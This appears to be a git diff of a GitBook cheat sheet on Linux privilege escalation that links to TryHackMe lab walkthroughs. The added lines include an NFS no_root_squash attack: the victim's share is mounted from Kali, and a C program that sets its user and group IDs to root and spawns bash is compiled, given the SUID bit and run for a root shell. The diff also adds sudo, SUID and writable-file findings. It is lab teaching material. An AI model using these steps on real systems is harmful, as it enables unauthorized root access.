@@ -41,6 +41,12 @@ env
 
 
 
+| Finding & Comments                                                 | Example                                                                                                     |
+| ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
+| Have permission to overwrite the contents of the file              | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
+| Change path to a different file since it's not using absolute path | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
+|                                                                    |                                                                                                             |
+
 **Victim**
 
 ```
@@ -71,9 +77,7 @@ View the contents of the system-wide crontab.
 cat /etc/crontab
 ```
 
-```
-cat /etc/crontab
-```
+
 
 <figure><img src="../../../../.gitbook/assets/image (44) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -172,22 +176,22 @@ sudo -l
 
 
 
-| Finding      | Comments             | Examples                                                                                                       |
-| ------------ | -------------------- | -------------------------------------------------------------------------------------------------------------- |
-| yum          | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention")                                  |
-| anansi\_util | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")                                    |
-| vi           |                      | [#escaping-vi-editor](../../../../walkthroughs/tryhackme/common-linux-privesc.md#escaping-vi-editor "mention") |
-| apache2      |                      | [#apache2](../../../../walkthroughs/tryhackme/linux-privesc.md#apache2 "mention")                              |
-| nmap         |                      | [#nmap](../../../../walkthroughs/tryhackme/linux-privesc.md#nmap "mention")                                    |
-| ftp          |                      | [#ftp](../../../../walkthroughs/tryhackme/linux-privesc.md#ftp "mention")                                      |
-| more         |                      | [#more](../../../../walkthroughs/tryhackme/linux-privesc.md#more "mention")                                    |
-| less         |                      | [#less](../../../../walkthroughs/tryhackme/linux-privesc.md#less "mention")                                    |
-| awk          |                      | [#awk](../../../../walkthroughs/tryhackme/linux-privesc.md#awk "mention")                                      |
-| man          |                      | [#man](../../../../walkthroughs/tryhackme/linux-privesc.md#man "mention")                                      |
-| vim          |                      | [#vim](../../../../walkthroughs/tryhackme/linux-privesc.md#vim "mention")                                      |
-| find         |                      | [#find](../../../../walkthroughs/tryhackme/linux-privesc.md#find "mention")                                    |
-| iftop        |                      | [#iftop](../../../../walkthroughs/tryhackme/linux-privesc.md#iftop "mention")                                  |
-|              |                      |                                                                                                                |
+| Finding      | Comments             | Examples                                                                                                                                                                               |
+| ------------ | -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| yum          | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention")                                                                                                          |
+| anansi\_util | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")                                                                                                            |
+| vi           |                      | [#escaping-vi-editor](../../../../walkthroughs/tryhackme/common-linux-privesc.md#escaping-vi-editor "mention")                                                                         |
+| apache2      |                      | [#apache2](../../../../walkthroughs/tryhackme/linux-privesc.md#apache2 "mention")                                                                                                      |
+| nmap         |                      | [#nmap](../../../../walkthroughs/tryhackme/linux-privesc.md#nmap "mention")                                                                                                            |
+| ftp          |                      | [#ftp](../../../../walkthroughs/tryhackme/linux-privesc.md#ftp "mention")                                                                                                              |
+| more         |                      | [#more](../../../../walkthroughs/tryhackme/linux-privesc.md#more "mention")                                                                                                            |
+| less         |                      | [#less](../../../../walkthroughs/tryhackme/linux-privesc.md#less "mention")                                                                                                            |
+| awk          |                      | [#awk](../../../../walkthroughs/tryhackme/linux-privesc.md#awk "mention")                                                                                                              |
+| man          |                      | [#man](../../../../walkthroughs/tryhackme/linux-privesc.md#man "mention")                                                                                                              |
+| vim          |                      | [#vim](../../../../walkthroughs/tryhackme/linux-privesc.md#vim "mention")                                                                                                              |
+| find         |                      | [#find](../../../../walkthroughs/tryhackme/linux-privesc.md#find "mention")[linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
+| iftop        |                      | [#iftop](../../../../walkthroughs/tryhackme/linux-privesc.md#iftop "mention")                                                                                                          |
+|              |                      |                                                                                                                                                                                        |
 
 ### SUID / SGID Executables - Known Exploits
 
@@ -399,6 +403,7 @@ getcap -r / 2>/dev/null
 | vim     | Can spawn shell                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
 | perl    | Can spawn shell                                                                                                                                                                                                      | [wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")                                 |
 | openssl | Can spawn shell                                                                                                                                                                                                      | [mindgames.md](../../../../walkthroughs/tryhackme/mindgames.md "mention")                                   |
+| vim     |                                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
 
 
 
@@ -520,7 +525,9 @@ Copy the key over to your Kali box (it's easier to just view the contents of the
 
 **Examples**
 
-[#nfs](../../../../walkthroughs/tryhackme/linux-privesc.md#nfs "mention")
+[#nfs](../../../../walkthroughs/tryhackme/linux-privesc.md#nfs "mention")[linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention")
+
+### Option #1
 
 Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
@@ -528,9 +535,10 @@ Check the NFS share configuration on the Debian VM.
 
 **Victim**
 
-```
-cat /etc/exports
-```
+<pre><code><strong>cat /etc/exports
+</strong></code></pre>
+
+no\_root\_squash is present
 
 <figure><img src="../../../../.gitbook/assets/image (1) (6) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -579,6 +587,56 @@ Back on the Debian VM, as the low privileged user account, execute the file to g
 
 <figure><img src="../../../../.gitbook/assets/image (7) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
+### Option #2
+
+**Victim**
+
+```
+showmount -e $VICTIM
+cat /etc/exports
+```
+
+<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../.gitbook/assets/image (11) (11).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+mkdir /root/attack
+mount -o rw $VICTIM:/home/ubuntu/sharedfolder /root/attack
+subl /root/attack/nfc.c
+```
+
+**nfc.c**
+
+```
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+**Kali**
+
+```
+gcc /root/attack/nfc.c -o /root/attack/nfc -w
+chmod +s /root/attack/nfc
+```
+
+**Victim**
+
+```
+cd /home/ubuntu/sharedfolder
+./nfc
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
 ## Kernel Exploits
 
 **Examples**
@@ -594,20 +652,10 @@ find / -type f -perm /g=w -exec ls -l {} + 2> /dev/null
 ```
 
 ```
-ps aux | grep -v "\[" | grep root
+find / -writable 2>/dev/null
 ```
 
-```
-dpkg -l # debian
-```
 
-```
-rpm -qa # red hat
-```
-
-```
-pacman -Qe # arch linux
-```
 
 ## **Ports**
 
